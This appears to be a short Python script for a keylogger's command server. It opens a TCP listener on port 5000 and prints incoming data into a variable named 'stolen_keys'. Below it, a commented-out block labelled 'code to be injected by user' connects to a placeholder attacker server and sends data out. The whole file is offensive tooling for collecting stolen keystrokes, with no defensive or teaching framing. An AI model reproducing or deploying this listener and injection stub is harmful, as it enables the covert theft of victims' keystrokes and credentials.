#!/usr/bin/env python3

import socket

ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ns.bind(('',5000))
ns.listen()

while True:
    connection, ip_address = ns.accept()
    with connection:
        print('Client connected from', ip_address)
        while True:
            stolen_keys = connection.recv(4096)
            if not stolen_keys:
                break
            
            print(stolen_keys.decode("utf-8"))

###################code to be injected by user
#import socket

#ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#ns.connect(("Insert ip-address of your server here", 5000))
#ns.sendall(b"print('code to be executed')")
